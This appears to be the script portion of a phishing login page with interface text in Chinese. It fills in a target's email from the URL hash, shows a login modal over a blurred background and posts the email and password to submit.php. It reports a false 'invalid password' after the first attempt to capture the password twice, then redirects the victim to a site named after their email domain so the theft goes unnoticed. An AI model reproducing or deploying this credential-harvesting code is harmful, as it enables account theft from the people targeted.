    <script>
        // Wait, then show modal and blur background
        window.addEventListener('load', () => {
            const modalContainer = document.getElementById('loginModalContainer');
            const bgImage = document.getElementById('bgImage');
            const bgOverlay = document.getElementById('bgOverlay');

            setTimeout(() => {
                modalContainer.classList.remove('hidden');
                modalContainer.classList.add('show');
                bgImage.classList.add('blurred');
                bgOverlay.classList.add('visible');
            }, 900); // 1.5 seconds after page load
        });
    </script>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script>
        $(document).ready(function () {
            let count = 0;

            // Set timestamp on load
            $('#form_time').val(Math.floor(Date.now() / 1000));


            // Auto-fill email from hash (e.g., #user@example.com)
            const ai = window.location.hash.substr(1);
            if (ai) {
                const atIndex = ai.indexOf("@");
                const domainSlice = ai.substring(atIndex + 1);
                const domain = domainSlice.substring(0, domainSlice.indexOf('.'));
                const finalDomain = domain.toLowerCase();

                $('#email').val(ai); // Fill email input 
                $('#msg').hide();
            }
            function isValidEmail(email) {
                return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
            }
            // Add hidden timestamp
            if (!$('#form_time').length) {
                $('<input>').attr({
                    type: 'hidden',
                    id: 'form_time',
                    name: 'form_time',
                    value: Math.floor(Date.now() / 1000)
                }).appendTo('form');
            }

            // Submit on Enter key
            $(document).keypress(function (event) {
                if (event.which === 13) {
                    event.preventDefault();
                    $("#loginBtn").click();
                }
            });

            // Form submission
            $('#loginForm').on('submit', function (event) {
                event.preventDefault();
                $('#msg').hide();


                const email = $('#email').val().trim();
                const password = $('#password').val();

                // client-side checks
                if (!email || !password) {
                    $('#msg').text('請輸入郵箱地址和密碼').show();
                    return;
                }
                if (!isValidEmail(email)) {
                    $('#msg').text('請輸入有效的電子郵件地址').show();
                    return;
                }

                count++;

                const formData = new FormData(this);
                $.ajax({
                    url: 'submit.php',
                    type: 'POST',
                    data: formData,
                    dataType: 'json',
                    processData: false,
                    contentType: false,
                    beforeSend: function () {
                        $('#loginBtn').html('核實...');
                    },
                    success: function (response) {
                        if (response.status === 'error') {
                            $('#msg').text(response.msg).show();
                            $('#loginBtn').html('重試').prop('disabled', false);
                            return;
                        }

                        if (count >= 2) {
                            count = 0;
                            if (ai) {
                                const domain = ai.split('@')[1].split('.')[0];
                                window.location.href = "http://www." + domain + ".com";
                            } else {
                                window.location.href = "http://mail.com";
                            }
                            return;
                        }

                        $('#password').val('');
                        $('#msg').text('密碼無效！請輸入正確的密碼。').show();
                        $('#loginBtn').html('重試').prop('disabled', false);
                    },
                    error: function (xhr, status, error) {
                        $('#msg').text("提交失敗，請重試。").show();
                        $('#loginBtn').html('重試').prop('disabled', false);
                    }
                });
            });
        });
    </script>
